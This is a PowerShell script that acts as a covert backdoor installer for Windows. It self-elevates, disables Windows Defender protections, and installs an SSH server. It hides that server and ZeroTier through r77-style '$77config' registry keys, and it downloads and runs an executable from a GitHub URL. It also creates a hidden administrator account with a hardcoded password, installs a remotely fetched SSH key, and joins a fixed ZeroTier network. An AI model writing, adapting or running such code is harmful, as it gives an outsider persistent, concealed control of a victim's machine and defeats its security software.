# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
# Proceed with the rest of the script only if running with administrator privileges

# Install SSH Server asynchronously
Start-Process powershell -ArgumentList "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'" -NoNewWindow -NoWait

# Disable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1

# Disable other components of Windows Defender
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1

# Define the base path for the $77config
$baseConfigPath = "HKLM:\SOFTWARE\$77config"

# Ensure the $77config and service_names key exists
if (-not (Test-Path $baseConfigPath)) {
    New-Item -Path $baseConfigPath -Force
}
if (-not (Test-Path "$baseConfigPath\service_names")) {
    New-Item -Path "$baseConfigPath\service_names" -Force
}

# Add ZeroTier One and SSH to the hidden services list
# Replace 'ZeroTierOneService' with the exact service name of ZeroTier One if different
New-ItemProperty -Path "$baseConfigPath\service_names" -Name "ZeroTierOneService" -Value "ZeroTierOneService" -PropertyType String -Force
New-ItemProperty -Path "$baseConfigPath\service_names" -Name "sshd" -Value "sshd" -PropertyType String -Force

# Proceed with the rest of the script for installing Chocolatey, ZeroTier One, SSH Server setup, etc.

# Define the URL and download location for improved.exe
$exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/improved.exe"
$exePath = "C:\Path\Where\You\Want\To\Save\improved.exe" # Update this path as needed

# Download improved.exe from the provided URL
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Execute improved.exe with elevation
Start-Process -FilePath $exePath -Verb RunAs -Wait

# The -Wait parameter causes the script to pause until improved.exe finishes running.

# Installation and setup steps for Chocolatey, ZeroTier One, and SSH Server

# Create a new user `ssh-user` with administrative privileges
$userName = "ssh-user"
$password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $userName

# Set the user to not show up in the sign-in screen (Registry edit for Windows 10/11)
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $userName -Value 0 -PropertyType DWord

# Adjusted part to download the SSH RSA public key from a specified URL

# Specify the URL for the RSA public key
$pubKeyUrl = "https://raw.githubusercontent.com/Ogyeet10/installer9000/main/id_rsa.pub"

# Define the path where the .ssh directory will be located for the user `ssh-user`
$sshFolderPath = "C:\Users\$userName\.ssh"
$authorizedKeysPath = "$sshFolderPath\authorized_keys"

# Create the .ssh directory if it doesn't exist
New-Item -ItemType Directory -Force -Path $sshFolderPath

# Download the public key and save it to the `authorized_keys` file
Invoke-WebRequest -Uri $pubKeyUrl -OutFile $authorizedKeysPath

# Change ownership and permissions of the .ssh folder and authorized_keys file to `ssh-user`
icacls $sshFolderPath /setowner $userName /T /C
icacls $sshFolderPath /grant "$userName:(OI)(CI)F" /T
icacls $authorizedKeysPath /setowner $userName
icacls $authorizedKeysPath /grant $userName:F

# Join the specified ZeroTier network
$networkId = "af78bf9436d39eb1" # Replace with your network ID
& "C:\ProgramData\ZeroTier\One\zerotier-cli.bat" join $networkId

Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier network: $networkId"
